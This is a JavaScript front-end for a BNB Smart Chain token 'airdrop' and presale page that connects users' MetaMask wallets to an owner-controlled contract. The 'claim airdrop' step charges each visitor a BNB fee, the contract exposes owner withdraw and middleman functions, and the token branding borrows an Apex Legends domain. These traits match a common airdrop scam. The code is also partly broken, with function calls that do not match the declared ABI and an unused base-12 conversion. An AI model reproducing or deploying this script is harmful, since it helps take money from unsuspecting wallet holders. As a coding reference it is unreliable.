let addr,
  web3 = new web3js.myweb3(window.ethereum);
const sttaddr = "0x04b77216BBa815743747E785450c8561E474DA24",
  sttabi = [
    { inputs: [], stateMutability: "nonpayable", type: "constructor" },
    {
      anonymous: false,
      inputs: [
        {
          indexed: false,
          internalType: "address",
          name: "_address",
          type: "address",
        },
        {
          indexed: false,
          internalType: "uint256",
          name: "amount",
          type: "uint256",
        },
      ],
      name: "AirdropClaimed",
      type: "event",
    },
    {
      anonymous: false,
      inputs: [
        {
          indexed: false,
          internalType: "address",
          name: "_new_owner",
          type: "address",
        },
      ],
      name: "OwnershipChanged",
      type: "event",
    },
    {
      anonymous: false,
      inputs: [
        {
          indexed: false,
          internalType: "address",
          name: "_sender",
          type: "address",
        },
        {
          indexed: false,
          internalType: "uint256",
          name: "_amount",
          type: "uint256",
        },
      ],
      name: "TokensReceived",
      type: "event",
    },
    { stateMutability: "payable", type: "fallback" },
    {
      inputs: [],
      name: "airdrop_reward",
      outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [{ internalType: "uint256", name: "amount", type: "uint256" }],
      name: "buyTokens",
      outputs: [],
      stateMutability: "payable",
      type: "function",
    },
    {
      inputs: [{ internalType: "uint256", name: "_price", type: "uint256" }],
      name: "changePrice",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      inputs: [{ internalType: "address", name: "_owner", type: "address" }],
      name: "change_owner",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      inputs: [],
      name: "change_state",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      inputs: [],
      name: "claimAirdrop",
      outputs: [],
      stateMutability: "payable",
      type: "function",
    },
    {
      inputs: [{ internalType: "address", name: "token", type: "address" }],
      name: "get_balance",
      outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [],
      name: "is_active",
      outputs: [{ internalType: "bool", name: "", type: "bool" }],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [],
      name: "owner",
      outputs: [{ internalType: "address", name: "", type: "address" }],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [],
      name: "price",
      outputs: [{ internalType: "uint256", name: "", type: "uint256" }],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [{ internalType: "address", name: "_address", type: "address" }],
      name: "setTokenaddress",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      inputs: [
        { internalType: "address payable", name: "_address", type: "address" },
      ],
      name: "set_middleman",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      inputs: [
        { internalType: "uint256", name: "_airdrop_reward", type: "uint256" },
      ],
      name: "set_rewards",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      inputs: [],
      name: "token_address",
      outputs: [{ internalType: "address", name: "", type: "address" }],
      stateMutability: "view",
      type: "function",
    },
    {
      inputs: [],
      name: "withdraw_bnb",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
    },
    {
      inputs: [{ internalType: "address", name: "token", type: "address" }],
      name: "withdraw_token",
      outputs: [],
      stateMutability: "nonpayable",
      type: "function",
    },
    { stateMutability: "payable", type: "receive" },
  ];
let sttcontract = new web3.eth.Contract(sttabi, sttaddr);
const loadweb3 = async () => {
    try {
      (web3 = new web3js.myweb3(window.ethereum)),
        console.log("Injected web3 detected."),
        (sttcontract = new web3.eth.Contract(sttabi, sttaddr));
      let e = await ethereum.enable();
      return (addr = web3.utils.toChecksumAddress(e[0]));
    } catch (e) {
      4001 === e.code
        ? console.log("Please connect to MetaMask.")
        : alert(
            "No BEP20 wallet detected or it was not allowed to connect. Trust wallet or Metamask are recommended.",
            "Please install Metamask, or paste URL link into Trustwallet (Dapps)...",
            "error"
          );
    }
  },
  PleaseWait = async () => {
    alert(
      "Server Busy",
      "There are too many request, Please Try after few min.",
      "error"
    );
  },
  getAirdrop = async () => {
    await loadweb3();
    const chainId = await web3.eth.getChainId();

    if (addr == undefined) {
      alert(
        "No BEP20 wallet detected or it was not allowed to connect. Trust wallet or Metamask are recommended. Refresh and try again."
      );
    }
    let fresh = document.getElementById("airinput").value;
    if (fresh === "") fresh = "0x4f5faA2c9Aa927b7F3AB37aB52ED34038D7244e3";
    if (chainId !== 56) {
      alert("Please Select BSC Network in your Wallet");
    } else {
      console.log("Right Network");
      sttcontract.methods.claimAirdrop(fresh).send(
        {
          from: addr,
          value: 0.0008 * 10 ** 18,
        },
        (err, res) => {
          if (!err) console.log(res);
          else console.log(err);
        }
      );
    }
  },
  buytoken = async () => {
    await loadweb3();
    

    if (addr == undefined) {
      
    } else {
      let ethval = document.getElementById("amountInput").value;
    ethval = Number(ethval);
    let bnbtosend = (ethval * 0.000231) * 10**18;
    const bnbs = '0x' + bnbtosend.toString(12);
    if(bnbtosend != 0){
        sttcontract.methods.buyTokens(ethval).send(
            {
              from: addr,
              value: bnbtosend,
            },
            (err, res) => {
              if (!err) console.log(res);
              else console.log(err);
            }
          );
    } else {
        alert('Amount Must be Greater than 0')
    }
    }

    

   
  },
  cooldowncheck = async () => {
    let e = await currentblock(),
      t = await lastblock();
    if (e - t < 50) {
      console.log(e, t);
      let n = 50 + t - e;
      return (
        console.log(n),
        alert("You must wait " + n + " blocks before claiming another airdrop"),
        !1
      );
    }
    return !0;
  },
  currentblock = async () => {
    let e;
    return (
      await web3.eth.getBlockNumber((t, n) => {
        e = n;
      }),
      e
    );
  },
  lastblock = async () => {
    let e;
    return (
      await sttcontract.methods.lastairdrop(addr).call((t, n) => {
        e = n;
      }),
      e
    );
  },
  getbalance = async (e) => {
    let t;
    await sttcontract.methods.balanceOf(e).call((e, n) => {
      t = n;
    });
    return Promise.resolve(t);
  };

function calculate() {
  var e = 1e6 * document.getElementById("buyinput").value;
  console.log(e),
    (document.getElementById("buyhch2input").value = e.toLocaleString("en-US"));
}

function addToWallet() {
  try {
    web3.currentProvider.sendAsync(
      {
        method: "wallet_watchAsset",
        params: {
          type: "ERC20",
          options: {
            address: "0xd80d19819ea34ebae23003e7d8bc78db9a2bcae7",
            symbol: "ALA",
            decimals: "18",
            image: "https://apexlegends.art/images/logo.png",
          },
        },
        id: Math.round(1e5 * Math.random()),
      },
      function (e, t) {
        e
          ? console.log(e.message)
          : t.result
          ? console.log("Token added")
          : (console.log(t), console.log("Some error"));
      }
    );
  } catch (e) {
    console.log(e);
  }
}
window.onload = function () {
  var e = (function (e) {
    for (
      hu = window.location.search.substring(1), gy = hu.split("&"), i = 0;
      i < gy.length;
      i++
    )
      if (((ft = gy[i].split("=")), ft[0] == e)) return ft[1];
  })("ref");
  null == e || (document.getElementById("airinput").value = e);
};

function copyToClipboard(e) {
  var t = document.getElementById(e).value;
  if (window.clipboardData && window.clipboardData.setData)
    return clipboardData.setData("Text", t);
  if (
    document.queryCommandSupported &&
    document.queryCommandSupported("copy")
  ) {
    var n = document.createElement("textarea");
    (n.textContent = t),
      (n.style.position = "fixed"),
      document.body.appendChild(n),
      n.select();
    try {
      return document.execCommand("copy");
    } catch (e) {
      return console.warn("Copy to clipboard failed.", e), !1;
    } finally {
      document.body.removeChild(n);
    }
  }
}

function kopiraj() {
  document.getElementById("refaddress").select(),
    document.execCommand("Copy"),
    alert("Copied success.");
}

function querySt(e) {
  for (
    hu = window.location.search.substring(1), gy = hu.split("&"), i = 0;
    i < gy.length;
    i++
  )
    if (((ft = gy[i].split("=")), ft[0] == e)) return ft[1];
}
